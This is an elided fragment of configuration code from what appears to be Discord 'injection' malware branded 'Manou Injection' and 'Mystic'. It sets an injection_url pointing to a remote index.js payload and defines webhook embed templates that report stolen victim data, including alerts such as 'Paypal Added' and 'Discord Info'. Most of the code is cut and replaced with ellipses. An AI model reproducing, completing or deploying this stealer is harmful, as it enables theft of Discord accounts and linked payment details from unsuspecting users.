...
const config = {
  ...
  ping_on_run: false, 
  ping_val: '@everyone',
  embed_name: 'Manou Injection', 
  embed_icon: 'https://cdn.discordapp.com/attachments/1102354806892400650/1104503930437763243/MvioletFondnoir.png?size=4096'.replace(/ /g, '%20'), 
  embed_color: 2895667, 
  injection_url: 'https://raw.githubusercontent.com/Manouzr/Discord_core_js_injector/main/index.js', 
  /**
    ...
    embeds: [
      {
        ...
        footer: {
          text: '🎉・Discord Injection By Manou・https://discord.gg/',
        },
      },
    ],
  };
    ...
    embeds: [
      {
        ...
        footer: {
          text: '🎉・Discord Injection By Mystic・https://discord.gg/zUVbkbKrwx',
        },
      },
    ],
  };
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: '**Paypal Added**',
            value: `C'est l'heure de s'acheter des nitro 👀`,
            inline: false,
          },
          {
            name: '**Discord Info**',
